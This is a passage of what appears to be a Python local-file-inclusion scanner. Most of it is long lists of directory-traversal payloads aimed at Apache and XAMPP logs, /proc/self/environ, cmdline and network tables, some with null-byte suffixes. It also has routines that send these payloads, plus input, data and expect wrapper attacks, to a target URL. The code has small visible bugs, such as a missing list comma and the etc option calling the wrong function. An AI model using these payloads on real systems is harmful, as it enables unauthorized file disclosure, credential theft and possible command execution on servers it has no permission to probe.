'../../../../../../../var/www/logs/error.log',
'../../../../../../../../var/www/logs/error.log',
'../../../../../../../../../var/www/logs/error.log',
'/var/log/apache2/access_log',
'../var/log/apache2/access_log',
'../../var/log/apache2/access_log',
'../../../var/log/apache2/access_log',
'../../../../var/log/apache2/access_log',
'../../../../../var/log/apache2/access_log',
'../../../../../../var/log/apache2/access_log',
'../../../../../../../var/log/apache2/access_log',
'../../../../../../../../var/log/apache2/access_log',
'../../../../../../../../../var/log/apache2/access_log',
'/var/log/apache/access_log',
'../var/log/apache/access_log',
'../../var/log/apache/access_log',
'../../../var/log/apache/access_log',
'../../../../var/log/apache/access_log',
'../../../../../var/log/apache/access_log',
'../../../../../../var/log/apache/access_log',
'../../../../../../../var/log/apache/access_log',
'../../../../../../../../var/log/apache/access_log',
'../../../../../../../../../var/log/apache/access_log',
'/etc/httpd/logs/error.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error_log',
'/logs/access_log',
'/usr/local/apache2/logs/access_log',
'/usr/local/apache2/logs/access.log',
'/usr/local/apache2/logs/error_log',
'/usr/local/apache2/logs/error.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/log/error_log',
'/var/log/error.log',
'/var/log/apache/error.log',
'/var/log/apache2/error.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/var/www/mgr/logs/error_log',
'/var/www/mgr/logs/error.log',
'/var/www/mgr/logs/access_log',
'/var/www/mgr/logs/access.log',
'/opt/lampp/logs/access_log',
'/opt/lampp/logs/access.log',
'/opt/lampp/logs/error_log',
'/opt/lampp/logs/error.log',
'/opt/xampp/logs/access_log',
'/opt/xampp/logs/access.log',
'/opt/xampp/logs/error_log',
'/opt/xampp/logs/error.log',]

    pa_self = ["/proc/self/environ",
               "../../../../../../../../../../../proc/self/environ",
               "/proc/self/environ%00",
               "../../../../../../../../../../../proc/self/environ%00"
               '/proc/self/environ',
'../proc/self/environ',
'../../proc/self/environ',
'../../../proc/self/environ',
'../../../../proc/self/environ',
'../../../../../proc/self/environ',
'../../../../../../proc/self/environ',
'../../../../../../../proc/self/environ',
'../../../../../../../../proc/self/environ',
'../../../../../../../../../proc/self/environ',
'../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../../../../../proc/self/environ',
'/proc/self/environ%00',
'../proc/self/environ%00',
'../../proc/self/environ%00',
'../../../proc/self/environ%00',
'../../../../proc/self/environ%00',
'../../../../../proc/self/environ%00',
'../../../../../../proc/self/environ%00',
'../../../../../../../proc/self/environ%00',
'../../../../../../../../proc/self/environ%00',
'../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../../../../../proc/self/environ%00',
'/proc/self/cmdline',
'../proc/self/cmdline',
'../../proc/self/cmdline',
'../../../proc/self/cmdline',
'../../../../proc/self/cmdline',
'../../../../../proc/self/cmdline',
'../../../../../../proc/self/cmdline',
'../../../../../../../proc/self/cmdline',
'../../../../../../../../proc/self/cmdline',
'../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../proc/self/cmdline',
'/proc/self/cmdline%00',
'../proc/self/cmdline%00',
'../../proc/self/cmdline%00',
'../../../proc/self/cmdline%00',
'../../../../proc/self/cmdline%00',
'../../../../../proc/self/cmdline%00',
'../../../../../../proc/self/cmdline%00',
'../../../../../../../proc/self/cmdline%00',
'../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../proc/self/cmdline%00',
'/proc/mounts',
'../proc/mounts',
'../../proc/mounts',
'../../../proc/mounts',
'../../../../proc/mounts',
'../../../../../proc/mounts',
'../../../../../../proc/mounts',
'../../../../../../../proc/mounts',
'../../../../../../../../proc/mounts',
'../../../../../../../../../proc/mounts',
'../../../../../../../../../../proc/mounts',
'../../../../../../../../../../../proc/mounts',
'../../../../../../../../../../../../proc/mounts',
'../../../../../../../../../../../../../proc/mounts',
'../../../../../../../../../../../../../../proc/mounts',
'../../../../../../../../../../../../../../../proc/mounts',
'/proc/net/tcp',
'../proc/net/tcp',
'../../proc/net/tcp',
'../../../proc/net/tcp',
'../../../../proc/net/tcp',
'../../../../../proc/net/tcp',
'../../../../../../proc/net/tcp',
'../../../../../../../proc/net/tcp',
'../../../../../../../../proc/net/tcp',
'../../../../../../../../../proc/net/tcp',
'../../../../../../../../../../proc/net/tcp',
'../../../../../../../../../../../proc/net/tcp',
'../../../../../../../../../../../../proc/net/tcp',
'../../../../../../../../../../../../../proc/net/tcp',
'../../../../../../../../../../../../../../proc/net/tcp',
'../../../../../../../../../../../../../../../proc/net/tcp',
'/proc/net/udp',
'../proc/net/udp',
'../../proc/net/udp',
'../../../proc/net/udp',
'../../../../proc/net/udp',
'../../../../../proc/net/udp',
'../../../../../../proc/net/udp',
'../../../../../../../proc/net/udp',
'../../../../../../../../proc/net/udp',
'../../../../../../../../../proc/net/udp',
'../../../../../../../../../../proc/net/udp',
'../../../../../../../../../../../proc/net/udp',
'../../../../../../../../../../../../proc/net/udp',
'../../../../../../../../../../../../../proc/net/udp',
'../../../../../../../../../../../../../../proc/net/udp',
'../../../../../../../../../../../../../../../proc/net/udp',
'/proc/mounts%00',
'../proc/mounts%00',
'../../proc/mounts%00',
'../../../proc/mounts%00',
'../../../../proc/mounts%00',
'../../../../../proc/mounts%00',
'../../../../../../proc/mounts%00',
'../../../../../../../proc/mounts%00',
'../../../../../../../../proc/mounts%00',
'../../../../../../../../../proc/mounts%00',
'../../../../../../../../../../proc/mounts%00',
'../../../../../../../../../../../proc/mounts%00',
'../../../../../../../../../../../../proc/mounts%00',
'../../../../../../../../../../../../../proc/mounts%00',
'../../../../../../../../../../../../../../proc/mounts%00',
'../../../../../../../../../../../../../../../proc/mounts%00',
'/proc/net/tcp%00',
'../proc/net/tcp%00',
'../../proc/net/tcp%00',
'../../../proc/net/tcp%00',
'../../../../proc/net/tcp%00',
'../../../../../proc/net/tcp%00',
'../../../../../../proc/net/tcp%00',
'../../../../../../../proc/net/tcp%00',
'../../../../../../../../proc/net/tcp%00',
'../../../../../../../../../proc/net/tcp%00',
'../../../../../../../../../../proc/net/tcp%00',
'../../../../../../../../../../../proc/net/tcp%00',
'../../../../../../../../../../../../proc/net/tcp%00',
'../../../../../../../../../../../../../proc/net/tcp%00',
'../../../../../../../../../../../../../../proc/net/tcp%00',
'../../../../../../../../../../../../../../../proc/net/tcp%00',
'/proc/net/udp%00',
'../proc/net/udp%00',
'../../proc/net/udp%00',
'../../../proc/net/udp%00',
'../../../../proc/net/udp%00',
'../../../../../proc/net/udp%00',
'../../../../../../proc/net/udp%00',
'../../../../../../../proc/net/udp%00',
'../../../../../../../../proc/net/udp%00',
'../../../../../../../../../proc/net/udp%00',
'../../../../../../../../../../proc/net/udp%00',
'../../../../../../../../../../../proc/net/udp%00',
'../../../../../../../../../../../../proc/net/udp%00',
'../../../../../../../../../../../../../proc/net/udp%00',
'../../../../../../../../../../../../../../proc/net/udp%00',
'../../../../../../../../../../../../../../../proc/net/udp%00']
    time.sleep(1)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Find Path /etc *")
    find_etc(url,pa_etc,proxy)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Find Path Logs /var/ *")
    find_log(url,pa_log,proxy)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Find Path Self /proc/ *")
    find_self(url,pa_self,proxy)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Wrapper *")
    input_wrap(url,proxy)
    data_wrap(url,proxy)
    expect_wrap(url,proxy)

def deep_scan(url,etc,sel,log,fd,proxy):
    time.sleep(1)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Find Path /etc :")
    find_etc(url,open_file("./path/path_etc.txt"),proxy)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Find Path Logs /var/ :")
    find_log(url,open_file("./path/path_log.txt"),proxy)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Find Path Self /proc/self/ :")
    find_self(url,open_file("./path/path_self.txt"),proxy)
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Find Path Self /proc/self/fd :")
    find_fd(url,open_file("./path/path_fd.txt"))
    print(Back.BLUE + Fore.LIGHTYELLOW_EX + "Testing Wrapper :")
    input_wrap(url,proxy)
    data_wrap(url,proxy)
    expect_wrap(url,proxy)
    print(Fore.CYAN+'='*30+' etc_path '+'='*30)
    for i in etc:
        print(Fore.GREEN+i)
    print(Fore.CYAN + '=' * 30+' self_path '+'='*30)
    for i in sel:
        print(Fore.GREEN+i)
    print(Fore.CYAN + '=' * 30+' logs_path '+'='*30)
    for i in log:
        print(Fore.GREEN+i)
    print(Fore.CYAN + '=' * 30 + ' /proc/self/fd ' + '=' * 30)
    for i in fd:
        print(Fore.GREEN + i)

if __name__ == '__main__':

    if args.URL and args.DEEP:
        banner(banner_t)
        print(Fore.LIGHTYELLOW_EX + "Started Deep Scan <+>")
        deep_scan(check_http(args.URL),etc_file,self_file,log_file,fd_file,args.PROXY)

    elif args.URL and args.SELF:
        banner(banner_t)
        print(Fore.LIGHTYELLOW_EX+"Started Self Scan <+>")
        find_self(check_http(args.URL), open_file("./path/path_self.txt"), args.PROXY)

    elif args.URL and args.FD:
        banner(banner_t)
        print(Fore.LIGHTYELLOW_EX+"Started Fd Scan <+>")
        find_fd(check_http(args.URL), open_file("./path/path_fd.txt"), args.PROXY)

    elif args.URL and args.LOG:
        banner(banner_t)
        print(Fore.LIGHTYELLOW_EX+"Started Log Scan <+>")
        find_log(check_http(args.URL), open_file("./path/path_log.txt"), args.PROXY)

    elif args.URL and args.ETC:
        banner(banner_t)
        print(Fore.LIGHTYELLOW_EX+"Started etc Scan <+>")
        find_fd(check_http(args.URL), open_file("./path/path_etc.txt"), args.PROXY)

    elif args.URL:# and args.FAST:
        banner(banner_t)
        print(Fore.LIGHTYELLOW_EX+"Started Fast Scan <+>")
        fast_scan(check_http(args.URL),args.PROXY)
